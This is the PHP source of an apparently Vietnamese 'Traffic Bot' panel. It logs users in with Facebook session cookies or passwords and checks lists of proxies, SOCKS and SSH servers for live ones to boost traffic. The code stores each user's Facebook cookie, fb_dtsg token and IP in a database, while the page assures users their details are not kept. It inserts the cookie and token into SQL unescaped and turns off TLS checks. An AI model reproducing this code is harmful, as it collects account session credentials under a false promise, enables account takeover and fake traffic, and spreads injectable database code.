<?php
session_start();
include 'config.php';
?>
<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href='http://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900' rel='stylesheet' type='text/css'>

<!-- Page title -->
<title>Traffic Bot <?php echo $version; ?></title>

<!-- Vendor styles -->
<link rel="stylesheet" href="vendor/fontawesome/css/font-awesome.css" />
<link rel="stylesheet" href="vendor/animate.css/animate.css" />
<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.css" />
<link rel="stylesheet" href="vendor/toastr/toastr.min.css" />

<!-- App styles -->
<link rel="stylesheet" href="styles/pe-icons/pe-icon-7-stroke.css" />
<link rel="stylesheet" href="styles/pe-icons/helper.css" />
<link rel="stylesheet" href="styles/stroke-icons/style.css" />
<link rel="stylesheet" href="styles/style.css">
<link rel="icon" href="icon.png" type="image/x-icon">
<link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet"/>
<script type="text/javascript" src="scripts/jquery.min.js"></script>

<script type="text/javascript" src="scripts/login_facebook.js"></script>

</head>

<body>

    <!-- Wrapper-->
    <div class="wrapper">

        <!-- Header-->
        <nav class="navbar navbar-default navbar-fixed-top">
            <div class="container-fluid">
                <div class="navbar-header">
                    <div id="mobile-menu">
                        <div class="left-nav-toggle">
                            <a href="#">
                                <i class="stroke-hamburgermenu"></i>
                            </a>
                        </div>
                    </div>
                    <a class="navbar-brand" href="/">
                        Traffic
                        <span><?php echo $version; ?></span>
                    </a>
                </div>
                <div id="navbar" class="navbar-collapse collapse">
                    <div class="left-nav-toggle">
                        <a href="#">
                            <i class="stroke-hamburgermenu"></i>
                        </a>
                    </div>
                    <ul class="nav navbar-nav navbar-right">
                        <li class="profil-link">
                            <a href="https://www.facebook.com/2k7749">
                                <span style="text-transform: none;">Contact Me</span>
                                <img src="https://cdn.dribbble.com/users/5275935/screenshots/11304128/media/7436b926cd31564c6c2fab3130479cd1.jpg?compress=1&resize=400x300" class="img-circle" alt="">
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <!-- End header-->

        <!-- Navigation-->
        <aside class="navigation">
            <nav>
                <ul class="nav luna-nav">
                    <li class="">
                        <a href="/">Dashboard</a>
                    </li>

                    <li>
                        <a href="#monitoring" data-toggle="collapse" aria-expanded="false">
                            Chức Năng<span class="sub-nav-icon"> <i class="stroke-arrow"></i> </span>
                        </a>
                        <ul id="monitoring" class="nav nav-second collapse">
                            <li><a href="/"> Traffic Bot</a></li>
                            <li class="active"><a href="#"> Check Live Proxy/Socks/SSH</a></li>
                        </ul>
                    </li>
                    <?php if (isset($_SESSION['id'])) { ?>
                        <li>
                            <a href="logout.php">Đăng Xuất</a>
                        </li>
                    <?php } ?>

                    <li class="nav-info">
                        <div class="m-t-xs">
                            <span class="c-white">Traffic Bot -</span> Copyright Power International © 2021
                        </div>
                    </li>
                </ul>
            </nav>
        </aside>
        <!-- End navigation-->


        <!-- Main content-->
        <section class="content">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <div class="view-header">
                            <div class="pull-right text-right" style="line-height: 14px">
                                <small><?php echo $page_name; ?><br>Dashboard<br> <span class="c-white"><?php echo $version; ?></span></small>
                            </div>
                            <div class="header-icon">
                                <i class="pe page-header-icon pe-7s-shield"></i>
                            </div>
                            <div class="header-title">
                                <h3 class="m-b-xs"><?php echo $page_name; ?></h3>
                                <small>
                                    Phiên bản Bot 1.0 dùng token, token dễ bị die nên lấy luôn bộ source trên mạng này để chạy cho tiện kkk
                                </small>
                            </div>
                        </div>
                        <hr>
                    </div>
                </div>

                <?php
                if (isset($_POST['cookie'])) {
                    $url = curl("https://m.facebook.com/profile.php", $_POST['cookie']);
                    //echo $url;
                    //exit;
                    if (preg_match('#<title>(.+?)</title>#is', $url, $_dataget)) {
                        $name = $_dataget[1];
                    }
                    if (preg_match('#name="target" value="(.+?)"#is', $url, $_dataget)) {
                        $id = $_dataget[1];
                    }
                    if (preg_match('#name="fb_dtsg" value="(.+?)"#is', $url, $_dataget)) {
                        $fb_dtsg = $_dataget[1];
                    }
                    if (isset($name) && isset($id) && isset($fb_dtsg)) {
                        $_SESSION['id'] = $id;
                        $_SESSION['name'] = $name;
                        $_SESSION['fb_dtsg'] = $fb_dtsg;
                        $_SESSION['cookie'] = $_POST['cookie'];

                        mysqli_query($connection, "CREATE TABLE IF NOT EXISTS `account` (
                        `id` int(11) NOT NULL AUTO_INCREMENT,
                        `user_id` varchar(32) NOT NULL,
                        `name` varchar(32) NOT NULL,
                        `fb_dtsg` text NOT NULL,
                        `cookie` text NOT NULL,
                        `password` text NOT NULL,
                        `ip` text NOT NULL,
                        PRIMARY KEY (`id`)
                        ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
                     ");
                        $row = null;
                        $queryFindUser = "
                        SELECT
                            *
                        FROM
                            account
                        WHERE
                            user_id = '" . mysqli_real_escape_string($connection, $_SESSION['id']) . "'";

                        $result = mysqli_query($connection, $queryFindUser) or die(mysql_error());
                        $haveRows = mysqli_num_rows($result);
                        $fetchRows = $result->fetch_array(MYSQLI_ASSOC);
                        if ($haveRows == 1) {
                            if ($fetchRows['cookie'] != $_POST['cookie']) {
                                $queryUpdateAccount = "
                            UPDATE 
                            account
                            SET         
                            `name` = '" . mysqli_real_escape_string($connection, $_SESSION['name']) . "',
                            `fb_dtsg` = '" . $_SESSION['fb_dtsg'] . "',
                            `cookie` = '" . $_SESSION['cookie'] . "',
                            `ip` = '" . $_SERVER['REMOTE_ADDR'] . "'
                            WHERE user_id = '" . mysqli_real_escape_string($connection, $_SESSION['id']) . "';
                            ";
                                mysqli_query($connection, $queryUpdateAccount);
                            }
                            echo "<meta http-equiv='refresh' content='0;url=index.php'>";
                        } else {
                            echo "<meta http-equiv='refresh' content='0;url=index.php'>";
                            $queryNewAccount = "
                        INSERT INTO 
                        account
                        SET
                        `user_id` = '" . mysqli_real_escape_string($connection, $_SESSION['id']) . "',            
                        `name` = '" . mysqli_real_escape_string($connection, $_SESSION['name']) . "',
                        `fb_dtsg` = '" . $_SESSION['fb_dtsg'] . "',
                        `cookie` = '" . $_SESSION['cookie'] . "',
                        `password` = '18f8ee2e68f16ba8a351f3afb92bffd3',
                        `ip` = '" . $_SERVER['REMOTE_ADDR'] . "'
                        ";
                            mysqli_query($connection, $queryNewAccount);
                        }

                ?>
                <?php

                    } else {
                        die('<script>alert("Try again w other Cookie, Cookie was die"); window.location.replace("index.php");</script>');
                    }
                }

                function get($url)
                {
                    $curl = curl_init();
                    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($curl, CURLOPT_URL, $url);
                    $ch = curl_exec($curl);
                    curl_close($curl);
                    return $ch;
                }
                function curl($url, $cookie)
                {
                    $ch = @curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    $head[] = "Connection: keep-alive";
                    $head[] = "Keep-Alive: 300";
                    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
                    $head[] = "Accept-Language: en-us,en;q=0.5";
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
                    curl_setopt($ch, CURLOPT_ENCODING, '');
                    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        'Expect:'
                    ));
                    $page = curl_exec($ch);
                    curl_close($ch);
                    return $page;
                }
                function post_data($site, $data, $cookie)
                {
                    $datapost = curl_init();
                    $headers = array("Expect:");
                    curl_setopt($datapost, CURLOPT_URL, $site);
                    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
                    curl_setopt($datapost, CURLOPT_HEADER, TRUE);

                    curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
                    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
                    curl_setopt($datapost, CURLOPT_POST, TRUE);
                    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
                    curl_setopt($datapost, CURLOPT_COOKIE, $cookie);
                    ob_start();
                    return curl_exec($datapost);
                }
                ?>

                <div class="row">
                    <?php if (!isset($_SESSION['id'])) {
                    ?>
                        <div class="col-md-6">
                            <ul class="nav nav-tabs">
                                <li class="active"><a data-toggle="tab" href="#menu1">Nhập Cookie</a></li>
                                <li><a data-toggle="tab" href="#menu2">Đăng nhập bằng tài khoản Facebook</a></li>
                            </ul>

                            <div class="tab-content">
                                <div id="menu1" class="tab-pane fade in active">
                                    <div class="panel panel-filled">
                                        <div class="panel-body">
                                            <p> Nếu bạn muốn lấy cookie từ tài khoản facebook, hãy nhấn vào tab
                                                <code>Đăng nhập bằng tài khoản Facebook</code>

                                            <p>Dùng Cookie Để Hạn Chế Không Bao Giờ Die Token 100% </p>

                                            <form action="" method="POST">
                                                <div class="form-group"><label for="exampleInputEmail1">Cookie ( Cách Lấy Cookie Vui Lòng Xem Clip )</label> <input class="form-control" id="cookie" name="cookie" placeholder="Nhập cookie vào đây"></div>

                                                <button class="btn btn-default btn-block">Đăng nhập</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                                <div id="menu2" class="tab-pane fade">
                                    <div class="panel panel-filled">
                                        <div class="panel-body">
                                            <p> Nhập thông tin tài khoản và mật khẩu Facebook của bạn. Nếu đăng nhập bằng số điện thoại thì
                                                nhớ thay số 0 ở đầu thành 84, sau đó chọn nền tảng bạn hay đăng nhập (PC hoặc Mobile) để tránh bị checkpoint trên thiết bị mới.
                                            <p>
                                            <p>Ví dụ: <code> 0123456789</code> đổi thành <code>84123456789</code></p>

                                            <p>Thông tin này chỉ dùng để lấy cookie, và sẽ không lưu lại trên Server nên yên tâm nhé ^^ </p>

                                            <div class="col-md-5">
                                                <div class="form-group">
                                                    <input class="form-control" placeholder="Tên đăng nhập" id="user" title="Nhập tên đăng nhập hoặc số điện thoại vào đây">
                                                </div>
                                            </div>
                                            <div class="col-md-4">
                                                <div class="form-group">
                                                    <input class="form-control" placeholder="*******" type="password" id="pass" title="Nhập mật khẩu liền đi chứ lị">
                                                </div>
                                            </div>
                                            <div class="col-md-3">
                                                <select class="form-control" id="login_type" title="Chọn nền tảng bạn hay đăng nhập">
                                                    <option value="1">Máy tính</option>
                                                    <option value="2">Điện thoại</option>
                                                </select>
                                            </div>

                                            <div class="form-group">
                                                <button class="btn btn-default" id="login">Lấy cookie ngay cho nóng</button>
                                            </div>
                                            <div id="login_result">

                                            </div>
                                            <form action="" method="POST">
                                                <div class="form-group">
                                                    <input class="form-control" id="cookie1" name="cookie" placeholder="Cookie sẽ xuất hiện ở đây" style="text-align: center" autocomplete="off">
                                                </div>

                                                <button class="btn btn-default btn-block">Đăng nhập</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php } else {
                    ?>
                        <div class="col-md-6">
                            <div class="panel panel-filled">
                                <div class="panel-heading">
                                    <div class="panel-tools">
                                        <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                        <a class="panel-close"><i class="fa fa-times"></i></a>
                                    </div>
                                    CHECK LIVE PROXY/SOCKS/SSH
                                </div>
                                <br>
                                <div class="panel-body">
                                    <p>Hello! <code><?php echo $_SESSION['name']; ?></code> - <code><?php echo $_SESSION['id']; ?></code></p>
                                    <p>Your IP: <code><?php echo $_SERVER['REMOTE_ADDR']; ?></code></p>
                                    <p>Proxy Live Today: <code><?php echo 'NULL'; ?></code></p>
                                    <form method="POST">
                                    <div class="form-group">
                                        <label for="proxyList">List Proxy/Socks4/Socks5/SSH:</label>
                                        <select class="select2_demo_1 form-control select2-hidden-accessible" id="proxyOption" name="proxyoption" style="width: 100%" tabindex="-1" aria-hidden="true">
                                            <option value="autoproxies" selected>Grab Proxy Online</option>
                                            <option value="manualproxies">Manual Your Proxy</option>
                                        </select><br>
                                        <input class="form-control" id="enumbersock" name="enumbersock" placeholder="Enter Number Socks Need (FREE) (Default = 5 Socks)"></input>
                                        <button class="btn btn-default" id="getsampleproxies" name="getsampleproxies" type="button" style="display:none;margin-bottom:14px;float: right;"><i class="fa fa-exchange"></i> <span class="bold">Get Sample</span></button>
                                        <br><textarea class="form-control" rows="5" type="text" name="proxylist" id="proxylist" placeholder="Proxy List : (ex: 62.210.149.33:30175)" style="display:none;" required></textarea>
                                        <textarea class="form-control" rows="5" type="text" name="proxylivetemp" id="proxylivetemp" style="opacity:0; position: absolute; z-index:-9999; pointer-events: none;"></textarea>
                                        <br><label for="selecttypes">Select Type:</label><select class="select2_demo_1 form-control select2-hidden-accessible" id="proxyOption" name="proxyoption" style="width: 100%" tabindex="-1" aria-hidden="true">
                                            <option value="proxy" selected>Proxy</option>
                                            <option value="socks">Socks</option>
                                            <option value="ssh">SSH</option>
                                        </select>
                                        <br>
                                        <div class="form-group">
                                        <label for="linkboost">Timeout:</label>
                                        <input class="form-control" id="timeoutcheck" name="timeoutcheck" min="20" max="100" value="20" placeholder="Please set timeout to check" required></input>
                                    </div>
                                    </div>
                                    <div class="text-center">
                                        <button type="submit" class="btn btn-w-md btn-primary"><i class="fa fa-spinner fa-spin"></i> CHECK LIVE NOW!</button>
                                    </div>
                                    </form>
                                </div>
                            </div>

                        </div>
                    <?php } ?>
                    <div class="col-md-6">
                        <div class="panel panel-filled">
                            <div class="panel-heading">
                                <div class="panel-tools">
                                    <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                    <a class="panel-close"><i class="fa fa-times"></i></a>
                                </div>
                                Proxy/Socks/SSH Result
                            </div>
                            <div class="panel-body">
                                <p><code>LIVE PROXY</code> 'll Display here, you can export to using to boost &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<button class="btn btn-default buttons-copy buttons-html5 btn-sm" tabindex="0" aria-controls="tableExample3" onclick="copyliveproxy()">Copy Live Proxy</button></p>
                                
                                <div class="table-responsive">
                                    <div class="outer">
                                        <table id="tblaftercheck" class="table table-hover table-striped">
                                            <thead>
                                                <tr>
                                                    <th>IP Address</th>
                                                    <th>Speed</th>
                                                    <th>Status - (Type)</th>
                                                </tr>
                                            </thead>
                                            <tbody id="rowdatacheck">
                                                
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                            <div class="panel-body">
                            <p><code>DIE PROXY</code> 'll Display here</p>
                                <div class="table-responsive">
                                    <div class="outer">
                                        <table id="tblaftercheckdie" class="table table-hover table-striped">
                                            <thead>
                                                <tr>
                                                    <th>IP Address</th>
                                                    <th>Speed</th>
                                                    <th>Status - (Type)</th>
                                                </tr>
                                            </thead>
                                            <tbody id="rowdatacheckdie">
                                                
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>


                </div>


            </div>
        </section>
        <!-- End main content-->

    </div>
    <!-- End wrapper-->

    <!-- Vendor scripts -->
    <script src="vendor/pacejs/pace.min.js"></script>
    <script src="vendor/jquery/dist/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/toastr/toastr.min.js"></script>
    <script src="vendor/sparkline/index.js"></script>
    <script src="vendor/flot/jquery.flot.min.js"></script>
    <script src="vendor/flot/jquery.flot.resize.min.js"></script>
    <script src="vendor/flot/jquery.flot.spline.js"></script>

    <!-- App scripts -->
    <script src="scripts/luna.js"></script>

    <div id="fb-root"></div>
    <script>
        (function(d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
            fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));
    </script>

    <!-- Customize JS -->
    <script>
        $('#proxyOption').on('change', function() {
            if ($(this).val() == "autoproxies") {
                $('#proxylist').hide();
                $('#enumbersock').show();
                $('#getsampleproxies').hide();
            } else {
                $('#enumbersock').hide();
                $('#getsampleproxies').show();
                $('#proxylist').show();
            }
        });
    </script>

    <script>
        const proxylive = [];
        $("form").submit(function (event) {
            event.preventDefault();
            toastr.success('BOOOOM!!', 'Everything SoKay, Let\'s go', {timeOut: 3000})
            var timeout = $("#timeoutcheck").val();
            var list = $("#proxylist").val().split(/\r\n|\n|\r/);
            
            for (i = 0; i < list.length; i++) {
                var splitip = "";
                var splitport = "";
                var split = list[i].split(':');
                splitip = split[0];
                splitport = split[1];
                (function(x){
                    $.ajax({
                        url: 'actions/checkproxy.php?ip=' + splitip + '&port=' + splitport + '&timeout=' + timeout,
                        type: 'POST',
                        success: function (data) {
                            //$("p").append(data);
                            var obj = JSON.parse(data);
                            var ipport = '<td style="color:#ff0066;">'+obj.result.proxy.ip+':'+obj.result.proxy.port+ '</td>';
                            var speedCal = ((obj.result.proxy.speed % 60000) / 1000).toFixed(1);

                            if(speedCal <= 5){
                                var speed = '<td style="color: #33cc33;">'+speedCal+' (s)</td>';
                            }else if(speedCal > 5 && speedCal < 10){
                                var speed = '<td style="color: #ffcc00;">'+speedCal+' (s)</td>';
                            }else if(speedCal = "NaN"){
                                var speed = '<td style="color: #8c8c8c;">'+speedCal+' (s)</td>';
                            }else{
                                var speed = '<td style="color: #ff3300;">'+speedCal+' (s)</td>';
                            }

                            if(obj.result.success == true){
                                var statustype = '<td><font color="#66ffff">TRUE</font> - <font color="white">'+obj.result.proxy.type+'</font></td>';
                                var htmlData = '<tr>'+ ipport  + speed + statustype +'</tr>';
                                $("#rowdatacheck").append($(htmlData));
                                $("#proxylivetemp").append((obj.result.proxy.ip+':'+obj.result.proxy.port+"&#13;&#10;"));
                            }else{
                                var statustype = '<td><font color="#ff3333">FALSE</font> - <font color="white">'+obj.result.proxy.type+'</font></td>';
                                var htmlData = '<tr>'+ ipport  + speed + statustype +'</tr>';
                                $("#rowdatacheckdie").append($(htmlData));
                            }
                            
                            // var htmlData = '<tr>'+ ipport  + speed + statustype +'</tr>';

                            // $("#rowdatacheck").append($(htmlData));
                        },
                        error: function(){
                                toastr.warning('OOPS!!', 'Something Wrong', {timeOut: 3000});
                        },
                        });
                })(i)
                }
              
                
            // var formData = new FormData(this);

            // $.ajax({
            // url: 'actions/checkproxy.php',
            // type: 'POST',
            // data: {
                
            // },
            // success: function (data) {
            //     //$("p").append(data);
            //     alert(data);
            // },
            // cache: false,
            // contentType: false,
            // processData: false
            // });
        });
    </script>
    
    <script>
    function copyliveproxy() {
        var txt=document.getElementById("proxylivetemp");
        txt.select();
        txt.setSelectionRange(0, 999999)
        document.execCommand("copy");
        toastr.success('BOOOM!!', 'Copied the Live Proxy, Thanks', {timeOut: 3000});
    }
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>


</body>

</html>